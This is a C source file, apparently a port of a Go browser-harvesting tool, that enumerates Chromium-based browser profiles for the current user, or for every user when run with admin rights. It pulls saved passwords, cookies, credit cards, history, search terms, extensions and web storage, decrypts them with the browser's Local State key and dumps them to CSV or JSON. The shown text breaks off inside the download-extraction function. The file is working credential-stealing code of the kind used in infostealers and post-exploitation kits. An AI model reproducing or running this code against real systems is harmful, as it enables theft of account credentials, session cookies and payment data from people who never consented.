/*
 * Chromium browser data extraction — mirrors Go's browser/chromium.go
 *
 * Extracts: History, Downloads, Cookies, Bookmarks, Login credentials
 * from Chromium-based browsers (Chrome, Edge, Brave, QQ, Opera, etc.)
 */
#include "browser/chromium.h"
#include "browser/utils.h"
#include "browser/sqlite.h"
#include "browser/crypto.h"

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <ctype.h>
#include <windows.h>

/* Diagnostic disabled for release */
static void cdiag(const char* msg) { (void)msg; }

/* ================================================================
 * Browser definitions (mirrors Go's browser list)
 * ================================================================ */
typedef struct {
    const char* name;
    const char* profile_path; /* Relative from user dir, e.g. \AppData\Local\... */
} BrowserDef;

typedef struct {
    char label[128];
    char path[MAX_PATH];
} ChromiumProfile;

typedef struct {
    char value[2048];
} BinaryString;

typedef struct {
    int scanned_files;
    int skipped_large_files;
    int skipped_unsupported_files;
    int skipped_read_failures;
    int fragments_found;
} StorageScanStats;

static const BrowserDef g_browsers[] = {
    {"Chrome",      "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"},
    {"Chrome Beta", "\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Default"},
    {"Chromium",    "\\AppData\\Local\\Chromium\\User Data\\Default"},
    {"Edge",        "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default"},
    {"360 Speed",   "\\AppData\\Local\\360chrome\\Chrome\\User Data\\Default"},
    {"360 Speed X", "\\AppData\\Local\\360ChromeX\\Chrome\\User Data\\Default"},
    {"Brave",       "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
    {"QQ",          "\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default"},
    {"Opera",       "\\AppData\\Roaming\\Opera Software\\Opera Stable"},
    {"OperaGX",     "\\AppData\\Roaming\\Opera Software\\Opera GX Stable"},
    {"Vought",      "\\AppData\\Roaming\\Browser from Vought\\User Data\\Default"},
    {"Vivaldi",     "\\AppData\\Local\\Vivaldi\\User Data\\Default"},
    {"CocCoc",      "\\AppData\\Local\\CocCoc\\Browser\\User Data\\Default"},
    {"Yandex",      "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default"},
    {"DCBrowser",   "\\AppData\\Local\\DCBrowser\\User Data\\Default"},
    {"Old Sogou",   "\\AppData\\Roaming\\SogouExplorer\\Webkit\\Default"},
    {"New Sogou",   "\\AppData\\Local\\Sogou\\SogouExplorer\\User Data\\Default"},
    {"Arc",         "\\AppData\\Local\\Packages\\TheBrowserCompany.Arc_*\\LocalCache\\Local\\Arc\\User Data\\Default"},
    {"DuckDuckGo",  "\\AppData\\Local\\Packages\\DuckDuckGo.DesktopBrowser_*\\LocalState\\EBWebView\\Default"},
};
#define BROWSER_COUNT (sizeof(g_browsers) / sizeof(g_browsers[0]))

static bool is_chromium_profile_dir(const char* name) {
    if (!name || !*name) return false;
    if (_stricmp(name, "Default") == 0) return true;
    if (_stricmp(name, "Guest Profile") == 0) return true;
    if (_strnicmp(name, "Profile ", 8) == 0) return true;
    return false;
}

static bool chromium_has_source_files(const char* profile_path) {
    char path[MAX_PATH];
    const char* candidates[] = {
        "History",
        "Bookmarks",
        "Login Data",
        "Web Data",
        "Secure Preferences",
        "Cookies",
        "Network\\Cookies",
        NULL
    };
    for (int i = 0; candidates[i]; i++) {
        snprintf(path, sizeof(path), "%s\\%s", profile_path, candidates[i]);
        if (path_exists(path)) return true;
    }
    return false;
}

static bool chromium_has_profile_marker(const char* profile_path) {
    char path[MAX_PATH];
    const char* markers[] = {"Preferences", "Preferences_02", NULL};
    for (int i = 0; markers[i]; i++) {
        snprintf(path, sizeof(path), "%s\\%s", profile_path, markers[i]);
        if (path_exists(path)) return true;
    }
    return false;
}

static int resolve_wildcard_path(const char* input, char* out, int out_size) {
    if (!input || !out || out_size <= 0) return -1;
    if (!strchr(input, '*')) {
        strncpy(out, input, out_size - 1);
        out[out_size - 1] = 0;
        return 0;
    }

    const char* star = strchr(input, '*');
    const char* seg_start = star;
    while (seg_start > input && seg_start[-1] != '\\' && seg_start[-1] != '/') seg_start--;
    const char* seg_end = star;
    while (*seg_end && *seg_end != '\\' && *seg_end != '/') seg_end++;

    char prefix[MAX_PATH];
    int prefix_len = (int)(seg_start - input);
    if (prefix_len <= 0 || prefix_len >= (int)sizeof(prefix)) return -1;
    memcpy(prefix, input, prefix_len);
    prefix[prefix_len] = 0;

    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\%.*s", prefix, (int)(seg_end - seg_start), seg_start);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return -1;
    FindClose(hFind);

    snprintf(out, out_size, "%s\\%s%s", prefix, fd.cFileName, seg_end);
    return 0;
}

static int collect_chromium_profiles(const char* root_path, ChromiumProfile* profiles, int max_profiles) {
    if (!root_path || !profiles || max_profiles <= 0 || !path_exists(root_path)) return 0;

    if (chromium_has_profile_marker(root_path) || chromium_has_source_files(root_path)) {
        strncpy(profiles[0].label, "(main)", sizeof(profiles[0].label) - 1);
        strncpy(profiles[0].path, root_path, sizeof(profiles[0].path) - 1);
        return 1;
    }

    int count = 0;
    char search[MAX_PATH];
    snprintf(search, sizeof(search), "%s\\*", root_path);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        if (!is_chromium_profile_dir(fd.cFileName)) continue;

        char profile_path[MAX_PATH];
        snprintf(profile_path, sizeof(profile_path), "%s\\%s", root_path, fd.cFileName);
        if (!chromium_has_profile_marker(profile_path) && !chromium_has_source_files(profile_path)) continue;

        if (count < max_profiles) {
            strncpy(profiles[count].label, fd.cFileName, sizeof(profiles[count].label) - 1);
            strncpy(profiles[count].path, profile_path, sizeof(profiles[count].path) - 1);
            count++;
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
    return count;
}

static int url_decode_component(const char* src, char* out, int out_sz) {
    int oi = 0;
    if (!src || !out || out_sz <= 0) return 0;
    for (int i = 0; src[i] && oi < out_sz - 1; i++) {
        if (src[i] == '+') out[oi++] = ' ';
        else if (src[i] == '%' && isxdigit((unsigned char)src[i+1]) && isxdigit((unsigned char)src[i+2])) {
            char hex[3] = { src[i+1], src[i+2], 0 };
            out[oi++] = (char)strtol(hex, NULL, 16);
            i += 2;
        } else out[oi++] = src[i];
    }
    out[oi] = 0;
    return oi;
}

static int extract_query_param_ci(const char* url, const char* key, char* out, int out_sz) {
    char pattern[64];
    snprintf(pattern, sizeof(pattern), "%s=", key);
    size_t pl = strlen(pattern);
    if (!url || !key || !out || out_sz <= 0) return 0;

    for (const char* p = url; *p; p++) {
        if ((p == url || p[-1] == '?' || p[-1] == '&' || p[-1] == '#') &&
            _strnicmp(p, pattern, pl) == 0) {
            const char* v = p + pl;
            const char* e = v;
            while (*e && *e != '&' && *e != '#') e++;
            char raw[1024];
            int len = (int)(e - v);
            if (len >= (int)sizeof(raw)) len = (int)sizeof(raw) - 1;
            memcpy(raw, v, len);
            raw[len] = 0;
            return url_decode_component(raw, out, out_sz);
        }
    }
    out[0] = 0;
    return 0;
}

static int extract_search_term_from_url(const char* url, char* out, int out_sz) {
    static const char* keys[] = {"q", "query", "p", "wd", "word", "keyword", "search", "text", NULL};
    if (!url || !out || out_sz <= 0) return 0;
    out[0] = 0;
    for (int i = 0; keys[i]; i++) {
        if (extract_query_param_ci(url, keys[i], out, out_sz) > 0) return 1;
    }
    return 0;
}

static const char* json_find_in_range(const char* start, const char* end, const char* needle) {
    size_t nl = strlen(needle);
    if (!start || !needle || nl == 0) return NULL;
    if (!end) return strstr(start, needle);
    for (const char* p = start; p + nl <= end; p++)
        if (memcmp(p, needle, nl) == 0) return p;
    return NULL;
}

static const char* json_object_end_simple(const char* obj) {
    int depth = 0, in_str = 0, esc = 0;
    for (const char* p = obj; *p; p++) {
        char c = *p;
        if (in_str) {
            if (esc) esc = 0;
            else if (c == '\\') esc = 1;
            else if (c == '"') in_str = 0;
            continue;
        }
        if (c == '"') in_str = 1;
        else if (c == '{') depth++;
        else if (c == '}' && --depth == 0) return p + 1;
    }
    return NULL;
}

static int json_get_value_simple(const char* start, const char* end, const char* key, char* out, int out_size) {
    if (!start || !key || !out || out_size <= 0) return 0;
    char pat[128];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char* p = json_find_in_range(start, end, pat);
    if (!p) return 0;
    p += strlen(pat);
    while ((!end || p < end) && *p && *p != ':') p++;
    if ((!end || p < end) && *p == ':') p++;
    while ((!end || p < end) && (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n')) p++;
    int n = 0;
    if (*p == '"') {
        p++;
        while ((!end || p < end) && *p && *p != '"' && n < out_size - 1) {
            if (*p == '\\' && p[1]) p++;
            out[n++] = *p++;
        }
    } else {
        while ((!end || p < end) && *p && *p != ',' && *p != '}' && !isspace((unsigned char)*p) && n < out_size - 1)
            out[n++] = *p++;
    }
    out[n] = 0;
    return n > 0;
}

static const char* json_find_object_by_key_simple(const char* json, const char* key) {
    if (!json || !key || !*key) return NULL;
    char pat[128];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char* p = json;
    while ((p = strstr(p, pat)) != NULL) {
        const char* q = p + strlen(pat);
        while (*q && isspace((unsigned char)*q)) q++;
        if (*q != ':') { p = q; continue; }
        q++;
        while (*q && isspace((unsigned char)*q)) q++;
        if (*q == '{') return q;
        p = q;
    }
    return NULL;
}

static int sb_contains_line(StrBuilder* sb, const char* marker) {
    if (!sb || !sb->buf || !marker || !*marker) return 0;
    return strstr(sb->buf, marker) != NULL;
}

static int append_unique_storage_row(char*** data, int* rows, int max_rows,
                                     const char* a, const char* b, const char* c, const char* d) {
    if (!data || !rows || *rows >= max_rows) return 0;
    for (int i = 0; i < *rows; i++) {
        if (strcmp(data[i][0], a ? a : "") == 0 &&
            strcmp(data[i][1], b ? b : "") == 0 &&
            strcmp(data[i][2], c ? c : "") == 0 &&
            strcmp(data[i][3], d ? d : "") == 0) return 0;
    }
    data[*rows] = (char**)malloc(sizeof(char*) * 4);
    data[*rows][0] = _strdup(a ? a : "");
    data[*rows][1] = _strdup(b ? b : "");
    data[*rows][2] = _strdup(c ? c : "");
    data[*rows][3] = _strdup(d ? d : "");
    (*rows)++;
    return 1;
}

static int extract_binary_strings(const uint8_t* buf, int len, BinaryString* out, int max_out) {
    int count = 0;
    for (int i = 0; i < len && count < max_out; ) {
        if (buf[i] >= 32 && buf[i] <= 126) {
            int j = i;
            while (j < len && buf[j] >= 32 && buf[j] <= 126) j++;
            if (j - i >= 4) {
                int n = j - i;
                if (n >= (int)sizeof(out[count].value)) n = (int)sizeof(out[count].value) - 1;
                memcpy(out[count].value, buf + i, n);
                out[count].value[n] = 0;
                count++;
            }
            i = j;
            continue;
        }
        if (i + 7 < len && buf[i] >= 32 && buf[i] <= 126 && buf[i + 1] == 0) {
            int j = i;
            int chars = 0;
            while (j + 1 < len && buf[j] >= 32 && buf[j] <= 126 && buf[j + 1] == 0) {
                j += 2;
                chars++;
            }
            if (chars >= 4) {
                int n = chars;
                if (n >= (int)sizeof(out[count].value)) n = (int)sizeof(out[count].value) - 1;
                for (int k = 0; k < n; k++) out[count].value[k] = (char)buf[i + k * 2];
                out[count].value[n] = 0;
                count++;
            }
            i = j;
            continue;
        }
        i++;
    }
    return count;
}

static int file_size_from_find_data(const WIN32_FIND_DATAA* fd) {
    ULONGLONG size = ((ULONGLONG)fd->nFileSizeHigh << 32) | fd->nFileSizeLow;
    if (size > 0x7fffffffULL) return 0x7fffffff;
    return (int)size;
}

static int collect_storage_fragments(const char* dir_path, BinaryString* out, int max_out, StorageScanStats* stats) {
    enum {
        STORAGE_MAX_FILES = 32,
        STORAGE_MAX_FILE_SIZE = 4 * 1024 * 1024
    };
    if (!dir_path || !path_exists(dir_path)) return 0;
    char search[MAX_PATH];
    snprintf(search, sizeof(search), "%s\\*", dir_path);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    int total = 0;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        if (stats && stats->scanned_files >= STORAGE_MAX_FILES) break;
        char full[MAX_PATH];
        snprintf(full, sizeof(full), "%s\\%s", dir_path, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }
        const char* ext = strrchr(fd.cFileName, '.');
        if (!ext) continue;
        if (_stricmp(ext, ".log") != 0 && _stricmp(ext, ".ldb") != 0 && _stricmp(ext, ".sst") != 0) {
            if (stats) stats->skipped_unsupported_files++;
            continue;
        }
        if (_stricmp(ext, ".sst") == 0) {
            if (stats) stats->skipped_large_files++;
            continue;
        }
        if (stats) stats->scanned_files++;
        if (file_size_from_find_data(&fd) > STORAGE_MAX_FILE_SIZE) {
            if (stats) stats->skipped_large_files++;
            continue;
        }
        int fl = 0;
        uint8_t* data = read_file(full, &fl);
        if (!data || fl <= 0) {
            if (stats) stats->skipped_read_failures++;
            free(data);
            continue;
        }
        int added = extract_binary_strings(data, fl, out + total, max_out - total);
        total += added;
        if (stats) stats->fragments_found += added;
        free(data);
        if (total >= max_out) break;
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
    return total;
}

static const char* find_search_term_for_url_id(SQLiteHandler* db, const char* url_id, char* out, int out_sz) {
    /* db must already have "keyword_search_terms" resident (read once by the
     * caller before the loop); this is a pure lookup, O(M) per call */
    if (!out || out_sz <= 0) return "";
    out[0] = 0;
    if (!db || !url_id || !*url_id) return out;
    int count = sqlite_get_row_count(db);
    for (int i = 0; i < count; i++) {
        const char* row_url_id = sqlite_get_value(db, i, "url_id");
        if (row_url_id && strcmp(row_url_id, url_id) == 0) {
            const char* term = sqlite_get_value(db, i, "term");
            if (term && *term) {
                strncpy(out, term, out_sz - 1);
                out[out_sz - 1] = 0;
                return out;
            }
        }
    }
    return out;
}

static bool is_blank_text(const char* s) {
    if (!s) return true;
    while (*s) {
        if (!isspace((unsigned char)*s)) return false;
        s++;
    }
    return true;
}

static void strip_cookie_hash_prefix(char* value, const char* host_key) {
    uint8_t digest[32];
    size_t len;
    if (!value || !host_key) return;
    len = strlen(value);
    if (len < sizeof(digest)) return;
    sha256_hash((const uint8_t*)host_key, (int)strlen(host_key), digest);
    if (memcmp(value, digest, sizeof(digest)) == 0) {
        memmove(value, value + sizeof(digest), len - sizeof(digest) + 1);
    }
}

/* ================================================================
 * Internal: per-user extraction of all data types
 * ================================================================ */
static void chromium_extract_for_user(const char* browser_name,
                                       const char* history_path,
                                       const char* bookmark_path,
                                       const char* login_path,
                                       const char* cookie_path,
                                       const char* state_path,
                                       const char* cookie_network_path,
                                       const char* web_data_path,
                                       const char* secure_preferences_path,
                                       const char* local_storage_dir,
                                       const char* session_storage_dir,
                                       const char* user_label,
                                        StrBuilder* sb) {
    cdiag("CHROMIUM: extract_for_user "); cdiag(browser_name); cdiag("\n");
    print_browser_progress(browser_name, user_label, "profile-start", "");
    sb_printf(sb, "========================== %s (%s) ==========================\n",
              browser_name, user_label);

    /* Login Data */
    if (path_exists(login_path) && path_exists(state_path)) {
        print_browser_progress(browser_name, user_label, "login-data", login_path);
        print_verbose("Get Login Data");
        const char* r = chromium_logins(login_path, state_path, browser_name);
        if (r && *r) sb_write(sb, r);
    }

    /* Bookmarks */
    if (path_exists(bookmark_path)) {
        print_browser_progress(browser_name, user_label, "bookmarks", bookmark_path);
        print_verbose("Get Bookmarks");
        const char* r = chromium_bookmark(bookmark_path);
        if (r && *r) sb_write(sb, r);
    }

    /* History */
    if (path_exists(history_path)) {
        print_browser_progress(browser_name, user_label, "history", history_path);
        print_verbose("Get History");
        const char* r = chromium_history(history_path, browser_name);
        if (r && *r) sb_write(sb, r);
    }

    /* Downloads */
    if (path_exists(history_path)) {
        print_browser_progress(browser_name, user_label, "downloads", history_path);
        print_verbose("Get Downloads");
        const char* r = chromium_download(history_path, browser_name);
        if (r && *r) sb_write(sb, r);
    }

    /* Cookies */
    {
        const char* active_cookie_path = NULL;
        if (cookie_network_path && path_exists(cookie_network_path)) active_cookie_path = cookie_network_path;
        else if (cookie_path && path_exists(cookie_path)) active_cookie_path = cookie_path;
        if (active_cookie_path && path_exists(state_path)) {
            print_browser_progress(browser_name, user_label, "cookies", active_cookie_path);
            print_verbose("Get Cookies");
            {
                const char* r = chromium_cookies(active_cookie_path, state_path, browser_name);
                if (r && *r) sb_write(sb, r);
            }
        }
    }

    /* Credit Cards */
    if (web_data_path && path_exists(web_data_path) && path_exists(state_path)) {
        print_browser_progress(browser_name, user_label, "credit-cards", web_data_path);
        print_verbose("Get Credit Cards");
        {
            const char* r = chromium_creditcards(web_data_path, state_path, browser_name);
            if (r && *r) sb_write(sb, r);
        }
    }

    if (secure_preferences_path && path_exists(secure_preferences_path)) {
        print_browser_progress(browser_name, user_label, "extensions", secure_preferences_path);
        print_verbose("Get Extensions");
        {
            const char* r = chromium_extensions(secure_preferences_path, browser_name);
            if (r && *r) sb_write(sb, r);
        }
    }

    if (local_storage_dir && path_exists(local_storage_dir)) {
        print_browser_progress(browser_name, user_label, "local-storage", local_storage_dir);
        print_verbose("Get LocalStorage");
        {
            const char* r = chromium_local_storage(local_storage_dir, browser_name);
            if (r && *r) sb_write(sb, r);
        }
    }

    if (session_storage_dir && path_exists(session_storage_dir)) {
        print_browser_progress(browser_name, user_label, "session-storage", session_storage_dir);
        print_verbose("Get SessionStorage");
        {
            const char* r = chromium_session_storage(session_storage_dir, browser_name);
            if (r && *r) sb_write(sb, r);
        }
    }
    print_browser_progress(browser_name, user_label, "profile-done", "");
}

/* ================================================================
 * GetChromium — extract data for one browser from all users
 * (mirrors Go's GetChromium function)
 * ================================================================ */
static const char* get_chromium(const char** name) {
    static StrBuilder sb;
    sb_init(&sb);
    browser_set_browser_name(name[0]);
    cdiag("CHROMIUM: get_chromium "); cdiag(name[0]); cdiag("\n");

    char history_path[MAX_PATH];
    char bookmark_path[MAX_PATH];
    char login_path[MAX_PATH];
    char cookie_path[MAX_PATH];
    char state_path[MAX_PATH];
    char cookie_network_path[MAX_PATH];
    char web_data_path[MAX_PATH];
    char secure_preferences_path[MAX_PATH];
    char local_storage_dir[MAX_PATH];
    char session_storage_dir[MAX_PATH];

    char state_dir[MAX_PATH];
    strncpy(state_dir, name[1], sizeof(state_dir) - 1);
    state_dir[sizeof(state_dir) - 1] = 0;
    char* def_pos = strstr(state_dir, "\\Default");
    if (def_pos) *def_pos = '\0';

    if (is_high_integrity()) {
        /* Admin: iterate all user profiles */
        char sys_drive[8];
        GetEnvironmentVariableA("SystemDrive", sys_drive, sizeof(sys_drive));
        char users_path[MAX_PATH];
        snprintf(users_path, sizeof(users_path), "%s\\Users", sys_drive);

        WIN32_FIND_DATAA fd;
        char search[MAX_PATH];
        snprintf(search, sizeof(search), "%s\\*", users_path);
        HANDLE hFind = FindFirstFileA(search, &fd);
        if (hFind == INVALID_HANDLE_VALUE) goto done;

        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
            if (strcmp(fd.cFileName, "All Users") == 0 ||
                strcmp(fd.cFileName, "Public") == 0 ||
                strcmp(fd.cFileName, "Default") == 0) continue;

            char root_path[MAX_PATH];
            {
                char raw_root[MAX_PATH];
                snprintf(raw_root, sizeof(raw_root), "%s\\%s%s", users_path, fd.cFileName, state_dir);
                if (resolve_wildcard_path(raw_root, root_path, sizeof(root_path)) != 0) continue;
            }
            snprintf(state_path, sizeof(state_path), "%s\\Local State", root_path);
            ChromiumProfile profiles[32];
            int profile_count = collect_chromium_profiles(root_path, profiles, 32);
            for (int pi = 0; pi < profile_count; pi++) {
                snprintf(history_path, sizeof(history_path), "%s\\History", profiles[pi].path);
                snprintf(bookmark_path, sizeof(bookmark_path), "%s\\Bookmarks", profiles[pi].path);
                snprintf(login_path, sizeof(login_path), "%s\\Login Data", profiles[pi].path);
                snprintf(cookie_path, sizeof(cookie_path), "%s\\Cookies", profiles[pi].path);
                snprintf(cookie_network_path, sizeof(cookie_network_path),
                         "%s\\Network\\Cookies", profiles[pi].path);
                snprintf(web_data_path, sizeof(web_data_path), "%s\\Web Data", profiles[pi].path);
                snprintf(secure_preferences_path, sizeof(secure_preferences_path), "%s\\Secure Preferences", profiles[pi].path);
                snprintf(local_storage_dir, sizeof(local_storage_dir), "%s\\Local Storage\\leveldb", profiles[pi].path);
                snprintf(session_storage_dir, sizeof(session_storage_dir), "%s\\Session Storage", profiles[pi].path);

                if (path_exists(history_path) || path_exists(bookmark_path) ||
                    path_exists(login_path) || path_exists(cookie_path) ||
                    path_exists(cookie_network_path) || path_exists(web_data_path) ||
                    path_exists(secure_preferences_path) || path_exists(local_storage_dir) ||
                    path_exists(session_storage_dir)) {
                    char user_label[256];
                    snprintf(user_label, sizeof(user_label), "%s / %s", fd.cFileName, profiles[pi].label);
                    chromium_extract_for_user(name[0], history_path, bookmark_path,
                                              login_path, cookie_path, state_path,
                                              cookie_network_path, web_data_path,
                                              secure_preferences_path, local_storage_dir, session_storage_dir,
                                              user_label, &sb);
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);

    } else {
        /* Non-admin: only current user */
        char user_profile[MAX_PATH];
        GetEnvironmentVariableA("USERPROFILE", user_profile, sizeof(user_profile));

        char root_path[MAX_PATH];
        {
            char raw_root[MAX_PATH];
            snprintf(raw_root, sizeof(raw_root), "%s%s", user_profile, state_dir);
            if (resolve_wildcard_path(raw_root, root_path, sizeof(root_path)) != 0) goto done;
        }
        snprintf(state_path, sizeof(state_path), "%s\\Local State", root_path);
        ChromiumProfile profiles[32];
        int profile_count = collect_chromium_profiles(root_path, profiles, 32);
        for (int pi = 0; pi < profile_count; pi++) {
            snprintf(history_path, sizeof(history_path), "%s\\History", profiles[pi].path);
            snprintf(bookmark_path, sizeof(bookmark_path), "%s\\Bookmarks", profiles[pi].path);
            snprintf(login_path, sizeof(login_path), "%s\\Login Data", profiles[pi].path);
            snprintf(cookie_path, sizeof(cookie_path), "%s\\Cookies", profiles[pi].path);
            snprintf(cookie_network_path, sizeof(cookie_network_path),
                     "%s\\Network\\Cookies", profiles[pi].path);
            snprintf(web_data_path, sizeof(web_data_path), "%s\\Web Data", profiles[pi].path);
            snprintf(secure_preferences_path, sizeof(secure_preferences_path), "%s\\Secure Preferences", profiles[pi].path);
            snprintf(local_storage_dir, sizeof(local_storage_dir), "%s\\Local Storage\\leveldb", profiles[pi].path);
            snprintf(session_storage_dir, sizeof(session_storage_dir), "%s\\Session Storage", profiles[pi].path);

            if (path_exists(history_path) || path_exists(bookmark_path) ||
                path_exists(login_path) || path_exists(cookie_path) ||
                path_exists(cookie_network_path) || path_exists(web_data_path) ||
                path_exists(secure_preferences_path) || path_exists(local_storage_dir) ||
                path_exists(session_storage_dir)) {
                char user_label[256];
                snprintf(user_label, sizeof(user_label), "Current User / %s", profiles[pi].label);
                chromium_extract_for_user(name[0], history_path, bookmark_path,
                                          login_path, cookie_path, state_path,
                                          cookie_network_path, web_data_path,
                                          secure_preferences_path, local_storage_dir, session_storage_dir,
                                          user_label, &sb);
            }
        }
    }

done:
    return sb_str(&sb);
}

/* ================================================================
 * ChromiumKernel — iterate all browsers
 * ================================================================ */
const char* chromium_kernel(void) {
    cdiag("chromium_kernel start");
    static StrBuilder sb;
    sb_init(&sb);
    for (int i = 0; i < (int)BROWSER_COUNT; i++) {
        const char* name[2] = { g_browsers[i].name, g_browsers[i].profile_path };
        print_browser_progress(name[0], "", "browser-start", name[1]);
        const char* r = get_chromium(name);
        if (r && *r) sb_write(&sb, r);
        print_browser_progress(name[0], "", "browser-done", "");
    }
    return sb_str(&sb);
}

/* ================================================================
 * SpecifyPath — custom path extraction
 * ================================================================ */
const char* chromium_specify_path(const char* browser_name, const char* path) {
    static StrBuilder sb;
    sb_init(&sb);
    browser_set_browser_name(browser_name);

    char history_path[MAX_PATH], bookmark_path[MAX_PATH], login_path[MAX_PATH];
    char cookie_path[MAX_PATH], state_path[MAX_PATH], cookie_network_path[MAX_PATH], web_data_path[MAX_PATH];
    char secure_preferences_path[MAX_PATH], local_storage_dir[MAX_PATH], session_storage_dir[MAX_PATH];

    snprintf(history_path, sizeof(history_path), "%s\\History", path);
    snprintf(bookmark_path, sizeof(bookmark_path), "%s\\Bookmarks", path);
    snprintf(login_path, sizeof(login_path), "%s\\Login Data", path);
    snprintf(cookie_path, sizeof(cookie_path), "%s\\Cookies", path);

    char sdir[MAX_PATH]; strncpy(sdir, path, sizeof(sdir)-1);
    char* dp = strstr(sdir, "\\Default");
    if (dp) *dp = '\0';
    snprintf(state_path, sizeof(state_path), "%s\\Local State", sdir);
    snprintf(cookie_network_path, sizeof(cookie_network_path), "%s\\Network\\Cookies", path);
    snprintf(web_data_path, sizeof(web_data_path), "%s\\Web Data", path);
    snprintf(secure_preferences_path, sizeof(secure_preferences_path), "%s\\Secure Preferences", path);
    snprintf(local_storage_dir, sizeof(local_storage_dir), "%s\\Local Storage\\leveldb", path);
    snprintf(session_storage_dir, sizeof(session_storage_dir), "%s\\Session Storage", path);

    if (path_exists(history_path) || path_exists(bookmark_path) ||
        path_exists(login_path) || path_exists(cookie_path) ||
        path_exists(cookie_network_path) || path_exists(web_data_path) ||
        path_exists(secure_preferences_path) || path_exists(local_storage_dir) ||
        path_exists(session_storage_dir)) {
        chromium_extract_for_user(browser_name, history_path, bookmark_path,
                                  login_path, cookie_path, state_path,
                                  cookie_network_path, web_data_path,
                                  secure_preferences_path, local_storage_dir, session_storage_dir,
                                  "(specified path)", &sb);
    }
    return sb_str(&sb);
}

/* ================================================================
 * History extraction
 * ================================================================ */
const char* chromium_history(const char* chrome_path, const char* browser_name) {
    cdiag("chromium_history start");
    static StrBuilder sb;
    sb_init(&sb);

    char tmp[MAX_PATH];
    print_browser_progress(browser_name, "", "history-copy-db", chrome_path);
    if (create_tmp_file(chrome_path, tmp, sizeof(tmp)) != 0) {
        { char _d[256]; snprintf(_d,sizeof(_d),"CHROMIUM: %s FAIL create_tmp_file History %s\n",browser_name,chrome_path); cdiag(_d); }
        print_browser_progress(browser_name, "", "history-copy-db-failed", chrome_path);
        return "";
    }

    print_browser_progress(browser_name, "", "history-open-sqlite", tmp);
    SQLiteHandler* db = sqlite_open(tmp);
    if (!db) { remove_file(tmp); return ""; }
    SQLiteHandler* search_db = sqlite_open(tmp);

    const char* header[] = {"URL", "TITLE", "AccessDate"};
    /* Dynamic data collection for CSV/JSON output */
    #define MAX_HISTORY 20000
    char*** data = (char***)malloc(sizeof(char**) * MAX_HISTORY);
    int data_rows = 0;
    int data_cols = 3;

    if (sqlite_read_table(db, "urls")) {
        int count = sqlite_get_row_count(db);
        { char _d[128]; snprintf(_d,sizeof(_d),"CHROMIUM: %s: %d history rows\n",browser_name,count); cdiag(_d); }
        /* read the search-terms table ONCE (its rows stay resident in
         * search_db); find_search_term_for_url_id only does lookups */
        if (search_db) sqlite_read_table(search_db, "keyword_search_terms");
        for (int i = 0; i < count; i++) {
            const char* url_id = sqlite_get_value(db, i, "id");
            const char* url = sqlite_get_value(db, i, "url");
            const char* title = sqlite_get_value(db, i, "title");
            const char* last_date_str = sqlite_get_value(db, i, "last_visit_time");
            int64_t last_date = atoll(last_date_str);
            char search_term[1024] = {0};

            char date_str[64];
            time_epoch_str(last_date, date_str, sizeof(date_str));
            if (url_id && *url_id && search_db) find_search_term_for_url_id(search_db, url_id, search_term, sizeof(search_term));
            if (!search_term[0] && url && *url) extract_search_term_from_url(url, search_term, sizeof(search_term));
            if (is_blank_text(url) && is_blank_text(title) && is_blank_text(date_str) && !search_term[0]) continue;

            sb_printf(&sb, "    ---------------------------------------------------------\n");
            sb_printf(&sb, "    [+] URL: %s\n", url);
            sb_printf(&sb, "    [+] TITLE: %s\n", title);
            if (search_term[0]) sb_printf(&sb, "    [+] SEARCH: %s\n", search_term);
            sb_printf(&sb, "    [+] AccessDate: %s\n", date_str);

            if (data_rows < MAX_HISTORY) {
                data[data_rows] = (char**)malloc(sizeof(char*) * 3);
                data[data_rows][0] = _strdup(url);
                data[data_rows][1] = _strdup(title);
                data[data_rows][2] = _strdup(date_str);
                data_rows++;
            }
        }
    }

    /* Write CSV/JSON if format is set */
    if (g_format[0] != '\0') {
        char filename[MAX_PATH];
        snprintf(filename, sizeof(filename), "%s\\%s_history", g_output_dir, browser_name);
        if (strcmp(g_format, "json") == 0)
            write_json(header, 3, (const char***)data, data_rows, data_cols, filename);
        else if (strcmp(g_format, "csv") == 0)
            write_csv(header, 3, (const char***)data, data_rows, data_cols, filename);
    }

    /* Cleanup data */
    for (int i = 0; i < data_rows; i++) {
        free(data[i][0]); free(data[i][1]); free(data[i][2]); free(data[i]);
    }
    free(data);

    sqlite_close(db);
    if (search_db) sqlite_close(search_db);
    remove_file(tmp);
    return sb_str(&sb);
}

/* ================================================================
 * Download extraction
 * ================================================================ */
const char* chromium_download(const char* chrome_path, const char* browser_name) {
    static StrBuilder sb;
    sb_init(&sb);

    char tmp[MAX_PATH];
    print_browser_progress(browser_name, "", "downloads-copy-db", chrome_path);
    if (create_tmp_file(chrome_path, tmp, sizeof(tmp)) != 0) {
